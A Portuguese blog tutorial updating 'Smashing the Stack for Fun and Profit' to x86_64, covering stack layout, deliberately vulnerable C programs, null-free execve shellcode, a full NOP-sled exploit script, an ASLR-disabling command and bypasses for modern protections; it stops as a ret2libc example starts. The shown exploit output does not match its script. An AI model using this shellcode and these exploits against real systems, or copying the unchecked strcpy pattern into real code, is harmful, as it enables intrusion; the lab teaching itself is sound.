---
title: "Smashing the Stack em 2026: Atualização para x86_64 (PT-BR)"
published: true
tags: [binary-exploitation, stack-overflow, x86_64]
---

## Introdução

Em novembro de 1996, Aleph One publicou na revista eletrônica Phrack (edição 49) o artigo **"Smashing the Stack for Fun and Profit"**. Pra mim, esse texto é uma das coisas mais bonitas já escritas na área de segurança. Não é exagero. É o tipo de material que te faz entender que computação de verdade acontece lá embaixo, nos bytes, nos registradores, na memória crua. Ele introduziu milhares de pesquisadores ao mundo da exploração de binários e se tornou referência absoluta na comunidade de segurança ofensiva.

Eu lembro de ter lido esse artigo pela primeira vez e sentido aquele estalo. Foi ele, junto com a conferência H2HC, que despertou em mim o interesse real por exploração de binários. Ver aquelas talks ao vivo, pesquisadores brasileiros quebrando coisas que pareciam impossíveis, e depois voltar pra casa e reler o Aleph One com outros olhos... isso mudou minha trajetória. Tem uma admiração genuína que eu carrego por esse texto e por tudo que ele representa na história do hacking.

No dia a dia eu trabalho mais na parte web, mas exploração de binário é uma área que admiro demais e levo como hobby. Tem algo nesse contato direto com a memória, com os registradores, com o fluxo de execução cru, que me fascina de um jeito diferente. É onde a máquina fica nua, sem abstração nenhuma te protegendo.

O artigo original explicava, de forma didática e progressiva, como funcionava a stack em processadores x86 (32 bits), como variáveis locais e endereços de retorno eram organizados na memória, e como um buffer overflow podia ser explorado para redirecionar o fluxo de execução de um programa e executar código arbitrário (shellcode).

### Por que uma atualização?

Passaram-se 30 anos. O mundo mudou bastante:

| Aspecto | 1996 (original) | 2026 (este artigo) |
|---------|-----------------|---------------------|
| Arquitetura | x86 (32 bits) | x86_64 (64 bits) |
| Registradores | EIP, ESP, EBP (32 bits) | RIP, RSP, RBP (64 bits) |
| Calling convention | cdecl (args na stack) | System V AMD64 ABI (args em registradores) |
| Endereços | 4 bytes, sem null bytes problemáticos | 8 bytes, endereços canônicos com null bytes |
| Proteções | Nenhuma | NX/DEP, ASLR, Stack Canaries, PIE, RELRO |
| Shellcode | Direto na stack | Requer bypass de NX (ROP/ret2libc) |

O artigo original continua sendo uma excelente introdução conceitual, mas os exemplos práticos **não funcionam mais** em sistemas modernos sem adaptação significativa. A ideia aqui é manter a abordagem didática do original, mas atualizar tudo para a realidade de 2026.

### Para quem é este artigo?

- Iniciantes em exploração de binários que querem entender os fundamentos
- Pesquisadores que leram o original e querem entender as diferenças em x64
- Jogadores de CTF que precisam de uma base sólida em pwn
- Profissionais de segurança que querem entender o que protegem

### Pré-requisitos

- Conhecimento básico de C
- Familiaridade mínima com Linux (terminal, compilação com gcc)
- Curiosidade sobre como programas funcionam "por baixo"

### Ambiente de laboratório

Todos os exemplos deste artigo foram compilados e testados nesta máquina:

```
$ uname -a
Linux kali 6.19.11+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.19.11-1kali1 (2026-04-09) x86_64 GNU/Linux

$ gcc --version
gcc (Debian 15.2.0-16) 15.2.0

$ gdb --version
GNU gdb (Debian 17.1-4) 17.1
```

Para reproduzir os exemplos, recomendo usar **Kali Linux** ou qualquer distribuição Linux x86_64 com GCC e GDB (com pwndbg ou gef instalado).

---

## Organização da Memória de um Processo

Quando um programa é executado no Linux, o kernel cria um espaço de endereçamento virtual para o processo. Em x86_64, o espaço de endereçamento teórico é de 2⁶⁴ bytes, mas na prática apenas 48 bits são usados (endereços canônicos), resultando em um espaço utilizável de 256 TB.

A organização típica da memória de um processo:

```
Endereços altos (0x7FFF...)
┌─────────────────────────┐
│        Stack            │ ← Cresce para baixo (endereços menores)
│          ↓              │
├─────────────────────────┤
│                         │
│    (espaço livre)       │
│                         │
├─────────────────────────┤
│          ↑              │
│        Heap             │ ← Cresce para cima (endereços maiores)
├─────────────────────────┤
│        BSS              │ ← Variáveis globais não inicializadas
├─────────────────────────┤
│        Data             │ ← Variáveis globais inicializadas
├─────────────────────────┤
│        Text             │ ← Código executável (read-only)
└─────────────────────────┘
Endereços baixos (0x0000...)
```

### Diferenças importantes em x86_64

1. **Endereços canônicos**: Em x86_64, endereços válidos em user space vão de `0x0000000000000000` a `0x00007FFFFFFFFFFF`. Isso significa que endereços de stack sempre começam com `0x00007F...`, contendo **null bytes** nos bytes mais significativos. Isso tem implicações diretas para exploração (veremos adiante).

2. **Tamanho dos ponteiros**: Todos os ponteiros têm 8 bytes (64 bits), o que significa que endereços de retorno na stack ocupam 8 bytes em vez de 4.

3. **Alinhamento**: A ABI System V AMD64 exige que a stack esteja alinhada em 16 bytes antes de uma instrução `call`. Isso afeta a construção de payloads.

### Verificando na prática

```c
/* memory_layout.c - Visualizar layout de memória */
#include <stdio.h>
#include <stdlib.h>

int global_init = 42;          /* segmento Data */
int global_uninit;             /* segmento BSS */

int main(int argc, char *argv[]) {
    int local_var = 1;         /* Stack */
    static int static_var = 2; /* segmento Data */
    char *heap_ptr = malloc(64); /* Heap */

    printf("== Layout de Memória (x86_64) ==\n\n");
    printf("[Text]  main()        = %p\n", (void *)main);
    printf("[Data]  global_init   = %p\n", (void *)&global_init);
    printf("[Data]  static_var    = %p\n", (void *)&static_var);
    printf("[BSS]   global_uninit = %p\n", (void *)&global_uninit);
    printf("[Heap]  heap_ptr      = %p\n", (void *)heap_ptr);
    printf("[Stack] local_var     = %p\n", (void *)&local_var);
    printf("[Stack] argc          = %p\n", (void *)&argc);

    free(heap_ptr);
    return 0;
}
```

Compilar e executar:

```bash
$ gcc -o memory_layout memory_layout.c -no-pie
$ ./memory_layout
== Layout de Memória (x86_64) ==

[Text]  main()        = 0x401156
[Data]  global_init   = 0x404030
[Data]  static_var    = 0x404034
[BSS]   global_uninit = 0x40403c
[Heap]  heap_ptr      = 0x46e9310
[Stack] local_var     = 0x7ffc3f979ee4
[Stack] argc          = 0x7ffc3f979edc
```

Observe: endereços de stack começam com `0x7fff...`, e os dois bytes mais significativos são sempre `0x0000` e `0x7f`. Isso é crucial para exploração.

---

## A Stack em x86_64

A stack é uma região de memória LIFO (Last In, First Out) usada para:

- Armazenar endereços de retorno de funções
- Salvar registradores
- Alocar variáveis locais
- Passar argumentos (parcialmente, veremos a seguir)

### Registradores fundamentais

| Registrador | Função |
|-------------|--------|
| **RSP** (Stack Pointer) | Aponta para o topo da stack (endereço mais baixo em uso) |
| **RBP** (Base Pointer) | Aponta para a base do stack frame atual |
| **RIP** (Instruction Pointer) | Endereço da próxima instrução a executar |

### Calling Convention: System V AMD64 ABI

Aqui está a **diferença mais significativa** em relação ao x86 original. No artigo de Aleph One, todos os argumentos de função eram passados pela stack. Em x86_64, os primeiros 6 argumentos inteiros/ponteiro são passados em **registradores**:

| Argumento | Registrador |
|-----------|-------------|
| 1º | RDI |
| 2º | RSI |
| 3º | RDX |
| 4º | RCX |
| 5º | R8 |
| 6º | R9 |
| 7º+ | Stack |

Argumentos de ponto flutuante usam XMM0-XMM7.

O valor de retorno vai em **RAX** (e RDX para valores de 128 bits).

**Implicação para exploração**: Não basta mais controlar a stack para controlar argumentos de funções. Pra chamar `system("/bin/sh")`, por exemplo, precisamos colocar o endereço de `"/bin/sh"` em **RDI**, não na stack. Isso torna a exploração mais complexa e é onde técnicas como ROP entram em cena.

### Anatomia de um Stack Frame

Quando uma função é chamada em x86_64:

```nasm
; Chamador (caller)
call funcao        ; push RIP (endereço de retorno) na stack, jump para funcao

; Chamado (callee) - prólogo
push rbp           ; salva o RBP do chamador
mov rbp, rsp       ; estabelece novo frame
sub rsp, N         ; aloca espaço para variáveis locais

; ... corpo da função ...

; Chamado (callee) - epílogo
leave              ; equivale a: mov rsp, rbp; pop rbp
ret                ; pop RIP da stack, jump para esse endereço
```

O stack frame resultante:

```
Endereços altos
┌─────────────────────────┐
│   Argumentos 7+         │ ← Se houver mais de 6 args
│   (do chamador)         │
├─────────────────────────┤
│   Endereço de retorno   │ ← 8 bytes, salvo pelo CALL
│   (saved RIP)           │
├─────────────────────────┤ ← RBP aponta aqui
│   RBP salvo             │ ← 8 bytes, salvo pelo PUSH RBP
│   (saved RBP)           │
├─────────────────────────┤
│   Variáveis locais      │ ← Alocadas pelo SUB RSP, N
│   buffer[64]            │
│   int x                 │
│   ...                   │
├─────────────────────────┤ ← RSP aponta aqui (topo da stack)
│                         │
Endereços baixos
```

### Demonstração prática

```c
/* stack_frame.c - Visualizar stack frame */
#include <stdio.h>
#include <stdint.h>

void funcao(int a, int b, int c) {
    char buffer[64];
    int local = 0xdeadbeef;
    register void *rbp_val asm("rbp");

    printf("== Stack Frame de funcao() ==\n");
    printf("Endereço de buffer:       %p\n", (void *)buffer);
    printf("Endereço de local:        %p\n", (void *)&local);
    printf("RBP atual:                %p\n", rbp_val);
    printf("Saved RBP (em *RBP):      0x%lx\n", *(uint64_t *)rbp_val);
    printf("Saved RIP (em *(RBP+8)):  0x%lx\n", *((uint64_t *)rbp_val + 1));
    printf("\n");
    printf("Distância buffer -> RIP:  %ld bytes\n",
           (char *)((uint64_t *)rbp_val + 1) - buffer);
    printf("Retornando para main em:  0x%lx\n", *((uint64_t *)rbp_val + 1));
}

int main() {
    funcao(1, 2, 3);
    printf("Retornou normalmente.\n");
    return 0;
}
```

```bash
$ gcc -o stack_frame stack_frame.c -fno-stack-protector -no-pie -g -O0
$ ./stack_frame
== Stack Frame de funcao() ==
Endereço de buffer:       0x7fffffffdbd0
Endereço de local:        0x7fffffffdbcc
RBP atual:                0x7fffffffdc10
Saved RBP (em *RBP):      0x7fffffffdc20
Saved RIP (em *(RBP+8)):  0x401266

Distância buffer -> RIP:  72 bytes
Retornando para main em:  0x401266
Retornou normalmente.
```

> **Nota**: Usamos `-fno-stack-protector` para desabilitar canários de stack (veremos sobre proteções adiante). Em um cenário real, essa proteção estaria ativa.

---

## Buffer Overflow: O Conceito Fundamental

A ideia central é simples: quando dados são escritos além dos limites de um buffer alocado, eles sobrescrevem dados adjacentes na memória. Na stack, isso pode sobrescrever o endereço de retorno salvo (saved RIP), e aí o atacante redireciona o fluxo de execução pra onde quiser.

### O exemplo clássico (atualizado para x64)

```c
/* vuln1.c - Buffer overflow básico */
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  /* Sem verificação de tamanho! */
    printf("Você digitou: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Uso: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable(argv[1]);
    printf("Programa encerrou normalmente.\n");
    return 0;
}
```

Compilar **sem proteções** (para fins didáticos):

```bash
$ gcc -o vuln1 vuln1.c -fno-stack-protector -no-pie -z execstack -g
```

Flags explicadas:
- `-fno-stack-protector`: desabilita stack canaries
- `-no-pie`: desabilita Position Independent Executable (endereços fixos)
- `-z execstack`: marca a stack como executável (desabilita NX)
- `-g`: inclui símbolos de debug

### Analisando com GDB

```bash
$ gdb ./vuln1
(gdb) disas vulnerable
Dump of assembler code for function vulnerable:
   0x0000000000401146 <+0>:     push   rbp
   0x0000000000401147 <+1>:     mov    rbp,rsp
   0x000000000040114a <+4>:     sub    rsp,0x50          ; 80 bytes para locais
   0x000000000040114e <+8>:     mov    QWORD PTR [rbp-0x48],rdi  ; salva argumento
   0x0000000000401152 <+12>:    mov    rdx,QWORD PTR [rbp-0x48]
   0x0000000000401156 <+16>:    lea    rax,[rbp-0x40]    ; buffer está em rbp-0x40
   0x000000000040115a <+20>:    mov    rsi,rdx           ; src = input
   0x000000000040115d <+23>:    mov    rdi,rax           ; dest = buffer
   0x0000000000401160 <+26>:    call   0x401030 <strcpy@plt>
   ...
```

Observações importantes:
- `buffer` está em `RBP - 0x40` (64 bytes abaixo de RBP)
- O saved RBP está em `RBP + 0x00`
- O saved RIP (endereço de retorno) está em `RBP + 0x08`
- **Distância de buffer até saved RIP**: 64 + 8 = **72 bytes**

### Provocando o crash

```bash
$ ./vuln1 $(python3 -c "print('A' * 60)")
Voce digitou: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Programa encerrou normalmente.

$ ./vuln1 $(python3 -c "print('A' * 80)")
Segmentation fault (exit code: 139)
```

O programa crashou com 80 A's! Vamos entender por quê:

```bash
$ gdb ./vuln1
(gdb) run $(python3 -c "print('A' * 80)")
Program received signal SIGSEGV, Segmentation fault.
0x0000000000401182 in vulnerable ()
(gdb) info registers rip rbp rsp
rip            0x401182            0x401182 <vulnerable+60>
rbp            0x4141414141414141  0x4141414141414141
rsp            0x7fffffffdb98      0x7fffffffdb98
```

O RBP foi sobrescrito com 'AAAA AAAA' (0x41 = 'A'). Vamos escrever mais para atingir o RIP:

```bash
$ gdb ./vuln1
(gdb) run $(python3 -c "print('A' * 72 + 'B' * 6)")
Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()
(gdb) info registers rip rbp
rip            0x424242424242      0x424242424242
rbp            0x4141414141414141  0x4141414141414141
```

**Controlamos o RIP!** O programa tentou executar a instrução no endereço `0x0000424242424242` (os 'B's = 0x42, com null bytes nos 2 bytes superiores por causa dos endereços canônicos).

### Mapeando o overflow

```
buffer[64]          saved RBP (8)    saved RIP (8)
[AAAA...64 bytes...][AAAAAAAA]       [BBBBBBBB]
                     ↑ offset 64      ↑ offset 72
```

Para controlar o RIP, precisamos de exatamente **72 bytes de padding** seguidos do endereço desejado.

---

## Redirecionando a Execução

Beleza, controlamos o RIP. E agora? O próximo passo é redirecioná-lo para algo útil. No artigo original de Aleph One, a técnica era direta: colocar shellcode na stack e apontar o RIP para ele. Vamos reproduzir isso primeiro (com proteções desabilitadas) e depois evoluir para técnicas modernas.

### Redirecionando para uma função existente

O caso mais simples: redirecionar a execução para uma função que já existe no programa.

```c
/* vuln2.c - Redirect para função existente */
#include <stdio.h>
#include <string.h>

void secret() {
    printf("[+] Função secreta executada! Você tem controle do fluxo.\n");
}

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Uso: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable(argv[1]);
    printf("Programa encerrou normalmente.\n");
    return 0;
}
```

```bash
$ gcc -o vuln2 vuln2.c -fno-stack-protector -no-pie -z execstack -g
```

Primeiro, encontrar o endereço de `secret()`:

```bash
$ objdump -d vuln2 | grep "<secret>"
0000000000401146 <secret>:
```

Agora construir o payload: 72 bytes de padding + endereço de `secret()` em little-endian:

```bash
$ python3 -c "
import struct
padding = b'A' * 72
addr = struct.pack('<Q', 0x401146)  # Q = unsigned long long (8 bytes), < = little-endian
payload = padding + addr
open('payload.bin', 'wb').write(payload)
"
$ ./vuln2 $(cat payload.bin)
[+] Função secreta executada! Você tem controle do fluxo.
Segmentation fault
```

Funcionou! O programa executou `secret()` em vez de retornar normalmente para `main()`. O segfault no final é esperado porque, após `secret()` retornar, o stack frame está corrompido.

### O problema dos null bytes em x86_64

Observe o endereço `0x0000000000401146`. Em little-endian:

```
\x46\x11\x40\x00\x00\x00\x00\x00
```

Há **5 null bytes** (`\x00`). Isso é um problema quando a função vulnerável usa `strcpy()`, `gets()`, ou qualquer função que trata `\x00` como terminador de string.

No nosso exemplo acima funcionou porque o endereço está no **final** do payload. Os null bytes terminam a string, mas o endereço já foi escrito na posição correta.

Mas se precisássemos colocar **múltiplos endereços** (como em uma ROP chain), os null bytes no meio do payload truncariam a cópia. Soluções:

1. **Usar funções que não param em null bytes**: `read()`, `recv()`, `fread()` copiam N bytes independente do conteúdo
2. **ROP gadgets em endereços sem null bytes**: buscar gadgets em regiões de endereço que não contêm `\x00`
3. **Stack pivot**: redirecionar RSP para uma região controlada onde o payload foi escrito via `read()`

### Shellcode na stack (método clássico, proteções desabilitadas)

No artigo original, Aleph One colocava shellcode diretamente na stack. Vamos reproduzir isso em x64 com proteções desabilitadas:

```c
/* vuln3.c - Shellcode na stack */
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[256];  /* Buffer maior para caber o shellcode */
    strcpy(buffer, input);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Uso: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable(argv[1]);
    return 0;
}
```

```bash
$ gcc -o vuln3 vuln3.c -fno-stack-protector -no-pie -z execstack -g
```

#### Shellcode x86_64 para execve("/bin/sh")

O shellcode clássico atualizado para 64 bits. Em x64, syscalls usam a instrução `syscall` (não `int 0x80`) e os argumentos vão em registradores diferentes:

| Syscall | RAX | RDI | RSI | RDX |
|---------|-----|-----|-----|-----|
| execve | 59 | filename | argv | envp |

```nasm
; shellcode_x64.asm - execve("/bin/sh", NULL, NULL)
; Tamanho: 27 bytes, sem null bytes

section .text
global _start

_start:
    xor    rdx, rdx          ; rdx = 0 (envp = NULL)
    xor    rsi, rsi          ; rsi = 0 (argv = NULL)
    push   rdx               ; null terminator na stack
    mov    rdi, 0x68732f6e69622f  ; "/bin/sh" em little-endian
    push   rdi               ; push "/bin/sh\0" na stack
    mov    rdi, rsp          ; rdi = ponteiro para "/bin/sh"
    mov    al, 59            ; syscall number para execve (evita null bytes)
    syscall                  ; execve("/bin/sh", NULL, NULL)
```

Os bytes correspondentes:

```python
shellcode = (
    b"\x48\x31\xd2"          # xor rdx, rdx
    b"\x48\x31\xf6"          # xor rsi, rsi
    b"\x52"                   # push rdx
    b"\x48\xbf\x2f\x62\x69"  # movabs rdi, 0x68732f6e69622f
    b"\x6e\x2f\x73\x68\x00"  #   "/bin/sh\0" (NOTA: contém null byte!)
    b"\x57"                   # push rdi
    b"\x48\x89\xe7"          # mov rdi, rsp
    b"\xb0\x3b"              # mov al, 59
    b"\x0f\x05"              # syscall
)
```

Problema: o `mov rdi, "/bin/sh\0"` contém um null byte. Versão sem null bytes:

```python
# Shellcode x64 execve("/bin/sh") - 27 bytes, NULL-free
shellcode = (
    b"\x48\x31\xf6"          # xor rsi, rsi
    b"\x56"                   # push rsi (null terminator)
    b"\x48\xbf\x2f\x62\x69"  # movabs rdi, 0x68732f2f6e69622f
    b"\x6e\x2f\x2f\x73\x68"  #   "/bin//sh" (// é equivalente a /)
    b"\x57"                   # push rdi
    b"\x48\x89\xe7"          # mov rdi, rsp
    b"\x48\x31\xd2"          # xor rdx, rdx
    b"\xb0\x3b"              # mov al, 59
    b"\x0f\x05"              # syscall
)
```

#### Exploit completo

```python
#!/usr/bin/env python3
"""
Exploit: Stack buffer overflow com shellcode em x64
Alvo: vuln3 (compilado sem proteções)
Objetivo: Demonstração didática de shellcode injection clássico
"""
import struct
import subprocess
import sys

# Shellcode: execve("/bin//sh", NULL, NULL) - 27 bytes, null-free
shellcode = (
    b"\x48\x31\xf6"
    b"\x56"
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    b"\x57"
    b"\x48\x89\xe7"
    b"\x48\x31\xd2"
    b"\xb0\x3b"
    b"\x0f\x05"
)

# Layout: buffer[256] + saved_rbp[8] + saved_rip[8]
BUFFER_SIZE = 256
OFFSET_RIP = BUFFER_SIZE + 8  # 264 bytes até o RIP

# Endereço do buffer na stack (obtido via GDB)
# NOTA: Este endereço varia! Obter com: (gdb) p &buffer
BUFFER_ADDR = 0x7fffffffdd10  # Ajustar conforme seu ambiente

# NOP sled + shellcode + padding + endereço de retorno
nop_sled = b"\x90" * (OFFSET_RIP - len(shellcode))  # NOP sled até o RIP
payload = shellcode + nop_sled  # Shellcode no início, NOPs preenchem
# Alternativa: NOPs primeiro, shellcode depois (mais confiável com NOP sled)
nop_sled_size = OFFSET_RIP - len(shellcode)
payload = b"\x90" * nop_sled_size + shellcode  # Hmm, isso não funciona

# Abordagem correta: NOP sled + shellcode + padding + endereço
nop_size = 200
payload = b"\x90" * nop_size                          # NOP sled
payload += shellcode                                   # Shellcode (27 bytes)
payload += b"A" * (OFFSET_RIP - len(payload))         # Padding até RIP
payload += struct.pack("<Q", BUFFER_ADDR + 50)        # Retorno para meio do NOP sled

print(f"[*] Tamanho do payload: {len(payload)} bytes")
print(f"[*] Shellcode: {len(shellcode)} bytes")
print(f"[*] Endereço de retorno: {hex(BUFFER_ADDR + 50)}")
print(f"[*] Executando...")

# Escrever payload em arquivo (evita problemas com null bytes no argv)
with open("/tmp/payload.bin", "wb") as f:
    f.write(payload)

print("[*] Payload salvo em /tmp/payload.bin")
print("[*] Execute: ./vuln3 $(cat /tmp/payload.bin)")
```

#### Encontrando o endereço do buffer com GDB

```bash
$ gdb ./vuln3
(gdb) break vulnerable
(gdb) run AAAA
Breakpoint 1, vulnerable (input=0x7fffffffe1a0 "AAAA") at vuln3.c:5
(gdb) p &buffer
$1 = (char (*)[256]) 0x7fffffffdd10
(gdb) quit
```

> **Nota importante**: O endereço exato do buffer muda entre execuções quando ASLR está ativo. Com `-no-pie` e ASLR desabilitado (`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`), o endereço é previsível.

#### Executando o exploit

Com ASLR desabilitado e o endereço correto do buffer, o exploit funciona:

```bash
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0
$ python3 exploit_shellcode.py
[*] Shellcode size: 48 bytes
[*] Payload: 272 bytes
[*] Retorno: 0x7fffffffdb34
[+] Starting local process './vuln3': pid 720595
[+] Shellcode executado! Shell obtido:
uid=1000(kali) gid=1000(kali) groups=1000(kali)
$
```

O shellcode foi executado na stack e obtivemos um shell. Isso só funciona porque compilamos com `-z execstack` (NX desabilitado). Em binários modernos, a stack não é executável e precisamos de técnicas como ROP.

### NOP Sled: Por que ainda é relevante

O NOP sled (sequência de instruções `NOP` = `\x90`) serve como "zona de pouso". Não precisamos acertar o endereço exato do shellcode, basta cair em qualquer ponto do NOP sled e a execução "desliza" até o shellcode.

```
┌──────────────────────────────────────────────────────────┐
│ NOP NOP NOP NOP ... NOP NOP │ SHELLCODE │ PADDING │ RET  │
│ \x90\x90\x90\x90...\x90\x90│           │ AAAA... │ ADDR │
└──────────────────────────────────────────────────────────┘
                    ↑
            RET aponta para algum lugar aqui
            (qualquer NOP funciona)
```

Em x64, com endereços de 48 bits efetivos e ASLR, o NOP sled sozinho não é suficiente para exploração confiável. Mas em cenários controlados (CTF, lab), continua sendo útil.

---

## Proteções Modernas: O que Mudou Desde 1996

Em 1996, não existia nenhuma proteção contra buffer overflow. Zero. Você estourava o buffer, sobrescrevia o RIP, e era isso. Hoje, sistemas modernos implementam múltiplas camadas de defesa. Entender cada uma é essencial pra saber como (e se) podem ser contornadas.

### NX/DEP (No-eXecute / Data Execution Prevention)

**O que faz**: Marca regiões de memória como não-executáveis. A stack, heap e segmentos de dados não podem executar código. Apenas o segmento `.text` é executável.

**Implementação**: Bit NX no page table entry (hardware, suportado desde AMD64).

**Impacto**: Shellcode na stack não executa mais. O processador gera uma exceção ao tentar executar instrução em página marcada como NX.

**Verificar**:
```bash
$ checksec --file=./programa
[*] '/home/kali/programa'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

```bash
$ readelf -l ./programa | grep GNU_STACK
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
                                                        ↑ RW (sem X) = NX ativo
```

**Bypass**: Return-Oriented Programming (ROP), ret2libc, ret2plt. A ideia é reutilizar código executável existente em vez de injetar novo código.

### ASLR (Address Space Layout Randomization)

**O que faz**: Randomiza os endereços base de stack, heap, bibliotecas compartilhadas e (com PIE) do próprio executável a cada execução.

**Implementação**: Kernel Linux (desde 2.6.12, 2005).

**Impacto**: Endereços não são previsíveis. Não é possível hardcodar endereços de retorno, gadgets ou funções de biblioteca.

**Verificar**:
```bash
$ cat /proc/sys/kernel/randomize_va_space
2
# 0 = desabilitado, 1 = stack/libs/mmap, 2 = tudo (inclui heap)
```

```bash
# Demonstrar randomização
$ for i in $(seq 1 5); do ./memory_layout 2>/dev/null | grep Stack; done
[Stack] local_var     = 0x7ffe9b82fb94
[Stack] local_var     = 0x7ffcadb47284
[Stack] local_var     = 0x7ffcf7ba2734
[Stack] local_var     = 0x7fff2e6f28a4
[Stack] local_var     = 0x7ffcadb25fa4
```

Cada execução tem endereços diferentes!

**Bypass**:
- **Information leak**: vazar um endereço de memória e calcular offsets relativos
- **Brute force**: em 32 bits era viável (2¹⁶ possibilidades para stack), em 64 bits é impraticável
- **Partial overwrite**: sobrescrever apenas os bytes menos significativos (que não mudam)
- **Format string**: vazar endereços da stack via `%p`
- **ret2plt**: endereços de PLT são fixos quando PIE está desabilitado

### Stack Canaries (Stack Smashing Protection)

**O que faz**: Insere um valor aleatório (canário) entre as variáveis locais e o saved RBP/RIP. Antes de retornar, a função verifica se o canário foi modificado.

**Implementação**: GCC (`-fstack-protector`, `-fstack-protector-all`, `-fstack-protector-strong`).

**Layout com canário**:
```
┌─────────────────────────┐
│   Endereço de retorno   │ ← saved RIP
├─────────────────────────┤
│   RBP salvo             │ ← saved RBP
├─────────────────────────┤
│   CANÁRIO (8 bytes)     │ ← Valor aleatório, primeiro byte = \x00
├─────────────────────────┤
│   Variáveis locais      │
│   buffer[64]            │
├─────────────────────────┤ ← RSP
```

Se o buffer overflow sobrescrever o canário, a verificação falha e o programa aborta:

```
*** stack smashing detected ***: terminated
Aborted (exit code: 134)
```

**Características do canário em x64 Linux**:
- 8 bytes de tamanho
- Primeiro byte é sempre `\x00` (null), o que impede leak via string functions
- Gerado aleatoriamente no início do processo (armazenado em TLS: `fs:0x28`)
- Verificado com `xor` antes do `ret`

**Código gerado pelo GCC com canário**:
```nasm
; Prólogo
mov    rax, QWORD PTR fs:0x28    ; Carrega canário do TLS
mov    QWORD PTR [rbp-0x8], rax  ; Salva na stack

; ... corpo da função ...

; Epílogo (antes do ret)
mov    rax, QWORD PTR [rbp-0x8]  ; Lê canário da stack
xor    rax, QWORD PTR fs:0x28    ; Compara com valor original
jne    __stack_chk_fail           ; Se diferente → abort
leave
ret
```

**Bypass**:
- **Information leak**: vazar o valor do canário (format string, over-read)
- **Brute force byte-a-byte**: em processos que fazem fork() sem re-randomizar (ex: servidores)
- **Overwrite sem passar pelo canário**: write-what-where primitives, index out-of-bounds
- **Sobrescrever o canário com o valor correto**: se conseguir leak primeiro

### PIE (Position Independent Executable)

**O que faz**: Compila o executável como código posição-independente, permitindo que o ASLR randomize também o endereço base do próprio programa (não apenas libs).

**Impacto**: Endereços de funções do programa, gadgets ROP no binário e strings no `.rodata` são todos randomizados.

**Verificar**:
```bash
$ file programa
programa: ELF 64-bit LSB pie executable, x86-64, ...
#                       ↑ "pie executable" vs "executable"

$ checksec --file=./programa
    PIE:      PIE enabled
```

**Bypass**: Necessário leak de endereço do binário para calcular base. Partial overwrite dos bytes menos significativos (que não mudam com PIE).

### RELRO (Relocation Read-Only)

**O que faz**: Protege a GOT (Global Offset Table) contra sobrescrita.

- **Partial RELRO**: GOT é preenchida lazily, mas `.got.plt` é writable
- **Full RELRO**: Todas as relocações são resolvidas no load time, GOT inteira é marcada read-only

**Impacto**: Com Full RELRO, não é possível sobrescrever entradas da GOT para redirecionar chamadas de função.

**Bypass**: Com Full RELRO, atacar outros alvos: hooks de malloc, `__free_hook`, `__malloc_hook` (removidos em glibc 2.34+), vtables, ponteiros de função em estruturas.

### Fortify Source

**O que faz**: Substitui funções inseguras por versões com verificação de tamanho em tempo de compilação e execução (`__strcpy_chk`, `__memcpy_chk`, etc.).

**Ativação**: `-D_FORTIFY_SOURCE=2` (padrão em muitas distros com `-O2`).

**Impacto**: `strcpy(buffer, input)` é substituído por `__strcpy_chk(buffer, input, sizeof(buffer))` quando o compilador consegue determinar o tamanho do buffer.

### Resumo de proteções e compilação

```bash
# Compilar SEM proteções (para estudo):
gcc -o vuln vuln.c -fno-stack-protector -no-pie -z execstack -Wl,-z,norelro

# Compilar COM todas as proteções (produção):
gcc -o prog prog.c -fstack-protector-strong -pie -fPIE -Wl,-z,relro,-z,now -D_FORTIFY_SOURCE=2 -O2

# Verificar proteções de um binário:
checksec --file=./programa
```

### Tabela de impacto nas técnicas de exploração

| Proteção | Shellcode na stack | ret2libc | ROP | Format string |
|----------|-------------------|----------|-----|---------------|
| NX | ❌ Bloqueia | ✅ Funciona | ✅ Funciona | ✅ Funciona |
| ASLR | Dificulta (endereço) | ❌ Endereço desconhecido | ❌ Gadgets desconhecidos | ✅ Pode vazar endereços |
| Canary | ❌ Detecta overflow | ❌ Detecta overflow | ❌ Detecta overflow | ✅ Pode vazar canário |
| PIE | Dificulta | ❌ PLT randomizado | ❌ Gadgets randomizados | ✅ Pode vazar base |
| Full RELRO | N/A | GOT read-only | GOT read-only | GOT read-only |

**Na prática**: em um binário moderno com todas as proteções, a exploração requer **encadeamento**. Algo como: format string para leak → calcular endereços → ROP chain com gadgets corretos → bypass de canário se necessário. É um quebra-cabeça, e é exatamente isso que torna a área tão interessante.

---

## Return-to-libc (ret2libc) em x86_64

Com NX habilitado, não podemos executar shellcode na stack. A solução: reutilizar código que **já é executável**, como funções da libc (`system()`, `execve()`, etc.).

### A diferença fundamental em x64

No x86 (32 bits), ret2libc era simples porque argumentos eram passados pela stack:

```
# x86 ret2libc (32 bits) - artigo original
[buffer padding][addr system()][addr exit()][addr "/bin/sh"]
                 ↑ sobrescreve RIP  ↑ retorno de system  ↑ argumento na stack
```

Em x86_64, o primeiro argumento vai em **RDI**, não na stack. Precisamos de um **gadget ROP** que coloque o valor desejado em RDI antes de chamar `system()`:

```
# x64 ret2libc
[buffer padding][gadget: pop rdi; ret][addr "/bin/sh"][addr system()]
                 ↑ sobrescreve RIP     ↑ vai para RDI   ↑ chamado após pop+ret
```

### Exemplo prático: ret2libc com NX ativo

```c
/* vuln4.c - ret2libc em x64 */
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);
}
